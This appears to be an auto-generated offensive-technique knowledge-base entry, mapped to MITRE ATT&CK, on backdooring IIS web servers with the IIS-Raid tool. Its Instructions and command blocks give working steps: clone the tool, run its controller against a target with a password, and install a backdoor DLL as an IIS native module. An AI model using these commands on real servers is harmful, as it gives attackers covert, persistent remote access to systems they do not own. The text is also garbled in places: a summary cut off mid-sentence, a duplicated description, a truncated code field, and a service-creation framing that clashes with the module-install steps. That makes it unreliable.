---
id: 22ea5c64-525e-4bb5-991d-b7f0bf1616e3
name: IIS Raid Backdoor Persistence
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:27.938270+00:00'
updated_at: '2023-04-10T20:37:21.181863+00:00'
tactics:
- '[[Persistence|TA0003 - Persistence]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Create or Modify System Process|T1543 - Create or Modify System Process]]'
- '[[New Service|T1050 - New Service]]'
sub_techniques:
- '[[Windows Service|T1543.003 - Windows Service]]'
tags:
- '[[IIS]]'
- '[[Serviceland]]'
- '[[Windows - Persistence]]'
commands:
- '[[Clone IIS-Raid repository]]'
- '[[Execute IIS-Raid script]]'
- '[[Install IIS-Backdoor module]]'
---

# IIS Raid Backdoor Persistence

## Summary

The IIS Raid Backdoor Persistence technique involves creating a new service or modifying an existing one to establish a persistent backdoor on a target system. This technique is commonly used by attackers to maintain access to a compromised system over an extended period of time. 

To establish the

## Description

# Description

The IIS Raid Backdoor Persistence technique involves creating a new service or modifying an existing one to establish a persistent backdoor on a target system. This technique is commonly used by attackers to maintain access to a compromised system over an extended period of time. 

To establish the backdoor, the attacker typically creates a new service with a unique name that is not easily detected. Alternatively, the attacker may modify an existing service to execute a malicious payload at startup. Once the service is established, the attacker can use it to execute commands or upload additional tools to the compromised system. 

This technique is valuable to attackers as it allows them to maintain access to a compromised system even if the initial point of entry is discovered and removed.

 

## Requirements

1. Access to the target system

1. Privileged access to create or modify services

 

## Defense

1. Regularly monitor services running on systems for any unusual or suspicious activity

1. Implement strong authentication and access controls to prevent unauthorized access to systems and services

1. Use endpoint protection tools that can detect and block suspicious activity, such as the creation of new services or modification of existing ones

 

## Objectives

1. Establish a persistent backdoor on a compromised system

1. Maintain access to the compromised system over an extended period of time

 

# Instructions

1. To use this command, follow these steps:
1. Clone the IIS-Raid repository using the command: $ git clone https://github.com/0x09AL/IIS-Raid
2. Run the iis_controller.py script with the target URL and password using the command: $ python iis_controller.py --url http://192.168.1.11/ --password SIMPLEPASS
3. Install the module by executing the following command: C:\Windows\system32\inetsrv\APPCMD.EXE install module /name:Module Name /image:"%windir%\System32\inetsrv\IIS-Backdoor.dll" /add:true

 



**Code**: [[$ git clone https://github.com/0x09AL/IIS-Raid
$ p]]



> This command is used to backdoor IIS using native modules. The command first clones the IIS-Raid repository and then runs the iis_controller.py script with the target URL and password. Finally, it installs the module by executing the specified command. The backdoor allows for remote access to the IIS server, which can be used to perform various malicious activities.



**Command** ([[Clone IIS-Raid repository]]):

```bash
$ git clone https://github.com/0x09AL/IIS-Raid
```





**Command** ([[Execute IIS-Raid script]]):

```bash
$ python iis_controller.py --url http://192.168.1.11/ --password SIMPLEPASS
```





**Command** ([[Install IIS-Backdoor module]]):

```bash
C:\Windows\system32\inetsrv\APPCMD.EXE install module /name:Module Name /image:"%windir%\System32\inetsrv\IIS-Backdoor.dll" /add:true
```



## MITRE ATT&CK Mapping

### Tactics

- [[Persistence|TA0003 - Persistence]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Create or Modify System Process|T1543 - Create or Modify System Process]]
- [[New Service|T1050 - New Service]]

### Sub-Techniques

- [[Windows Service|T1543.003 - Windows Service]]

## Commands Used

- [[Clone IIS-Raid repository]]
- [[Execute IIS-Raid script]]
- [[Install IIS-Backdoor module]]

## Tags

- [[IIS]]
- [[Serviceland]]
- [[Windows - Persistence]]


